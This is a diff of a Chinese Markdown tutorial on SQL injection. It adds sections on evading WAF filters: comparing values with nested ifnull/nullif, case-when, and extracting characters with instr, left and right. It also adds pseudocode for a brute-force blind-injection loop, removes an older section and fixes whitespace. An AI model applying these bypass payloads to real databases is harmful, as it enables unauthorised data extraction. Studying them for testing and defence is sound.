@@ -1203,7 +1203,7 @@ ERROR 1105 (HY000): XPATH syntax error: '~security'
 >   只能使用`substring()`、`substr()`、`left()`、`right()`、`regexp()`等函数分批次获取：？？？？？？？？？？TODO：？？？
 >
 >   ```
->           
+>               
 >   ```
 >
 >   
@@ -1470,21 +1470,21 @@ Runtime error: integer overflow
 >   +-------------------------+
 >   |     9223372036854776000 |
 >   +-------------------------+
->         
+>             
 >   mysql> select abs(0x8000000000000000);
 >   +-------------------------+
 >   | abs(0x8000000000000000) |
 >   +-------------------------+
 >   |     9223372036854776000 |
 >   +-------------------------+
->         
+>             
 >   mysql> select abs(0x7fffffffffffffff + 1);
 >   +-----------------------------+
 >   | abs(0x7fffffffffffffff + 1) |
 >   +-----------------------------+
 >   |         9223372036854776000 |
 >   +-----------------------------+
->         
+>             
 >   mysql> select abs(0xFFFFFFFFFFFFFFFF);
 >   +-------------------------+
 >   | abs(0xFFFFFFFFFFFFFFFF) |
@@ -1854,6 +1854,95 @@ Query OK, 0 rows affected (0.00 sec)
 
 
 
+## §4.2 比较数字大小
+
+众所周知，SQL提供`=`、`<`、`>`、`<=`、`>=`、`<>`用于比较数字的大小。假如WAF过滤了`<`、`>`、`=`这三种字符，我们怎么比较呢？
+
+### §4.2.1 `ifnull()`与`nullif()`
+
+| 函数名        | 返回值                                  |
+| ------------- | --------------------------------------- |
+| `ifnull(a,b)` | return a != NULL ? a : b（Null就返回b） |
+| `nullif(a,b)` | return a=b ? NULL : a（猜对就返回Null） |
+
+我们使用`nullif(待测值,猜测值)`，通过穷举`猜测值`可以得到`猜测结果`。再使用`ifnull(猜测结果,失败值)`，可以得到`成功值`。将这两个函数套起来使用，我们最终得到的返回值等价于`待测值==猜测值 ? 成功值 : 待测值`。此处的`成功值`由攻击者完全可控：
+
+```sql
+mysql> select ifnull(nullif(length((SELECT子句)),猜测值),失败值); # 猜测字符串长度
+
+mysql> select ifnull(nullif(length((select(database()))),7),-1);
+	# 8,猜测失败,返回字符串长度
+mysql> select ifnull(nullif(length((select(database()))),8),-1);
+	# -1,猜测成功,返回成功值
+mysql> select ifnull(nullif(length((select(database()))),9),-1);
+	# 8,猜测失败，返回字符串长度
+```
+
+由于成功值完全可控，我们可以使其等于一些异常值，使SQL语句报错，详见报错注入。
+
+### §4.2.2 `case()when()then()else()`
+
+SQL中有一类`case`语句，其作用类似于其他编程语言中的`switch()`。按理来说，`case()`提供的功能也可以视为一种比较：
+
+```sql
+mysql> select case(待测值)when(猜测值1)then(成功值1)when(猜测值2)then(成功值2)else(失败值)end;
+
+mysql> select username,case username
+    when '嘉然Diana' then 'Asoul'
+    when '七海Nana7mi' then 'Virtual Real'
+    when '白神遥Haruka' then 'PSP Live'
+    else '其它'
+    end as '所属社团'
+from users;
+```
+
+### §4.2.3 `regexp()`
+
+`regexp()`
+
+## §4.3 从字符串中提取字符
+
+我们知道，`substr()`与`substring()`（`substr(字符串，从1开始的起始位置,截取长度)`）经常被用于从字符串中提取字符。假如WAF拦截了这个函数，我们该怎么办呢？
+
+### §4.3.1 `instr()`
+
+`instr(字符串,子字符串)`用于返回子字符串在字符串中第一次出现时，第一个字符的位置（从一开始数）。
+
+> 注意：此函数不区分字符的大小写。
+
+```sql
+mysql> select(instr((select(database())),'e'));
++-----------------------------------+
+| (instr((select(database())),'e')) |
++-----------------------------------+
+|                                 2 |
++-----------------------------------+
+```
+
+```c
+function getData(){
+	SELECT子句 = input(输入SELECT子句);
+	子字符串 = '';
+    while(1){
+    	for(int ascii = 0 ; ascii < 128 ; ascii++){
+            if((子字符串+ascii)得到的结果 = 1){
+                子字符串 += ascii
+                break;
+            }
+        }
+    }
+}
+```
+
+### §4.3.2 `left()`与`right()`
+
+| 函数名                   | 返回值                                     |
+| ------------------------ | ------------------------------------------ |
+| `left(字符串,截取长度)`  | 从字符串最左端开始，截取固定长度的子字符串 |
+| `right(字符串,截取长度)` | 从字符串最右端开始，截取固定长度的子字符串 |
+
+
+
 ## §4.2 绕过空格与运算符
 
 对于这个注入点：`SELECT * FROM users WHERE id='' LIMIT 0,1`，并且过滤了空格与`and`、`or`，可以使用`^`运算符。其优点在于这个二元运算符两侧的表达式之间不必有空格，可以错误注入。
@@ -1886,17 +1975,7 @@ Query OK, 0 rows affected (0.00 sec)
 
 或者TODO：？？？？？？？`select/**/*/**/from/**/users`
 
-## §4.3 盲注绕`>`、`<`、`=`
 
-`ifnull(a,b)`：return a != NULL ? a : b
-
-`nullif(a,b)`：return a=b ? NULL : a
-
-令`a = length((SELECT(flag)from(flag)))`，`b = 从1到n穷举`，则`nullif(a,b)`返回值等价于`a=b ? NULL : a`
-
-令`a = 上面nullif()的返回值`，`b = 0x8000000000000000`，则`ifnull(a,b)`返回值等价于`a=b ? 大数 : LENGTH长度`
-
-再套上一层abs()大数溢出注入即可。
 
 ## §4.4 截取字符串绕`substr()`与`substring()`
 
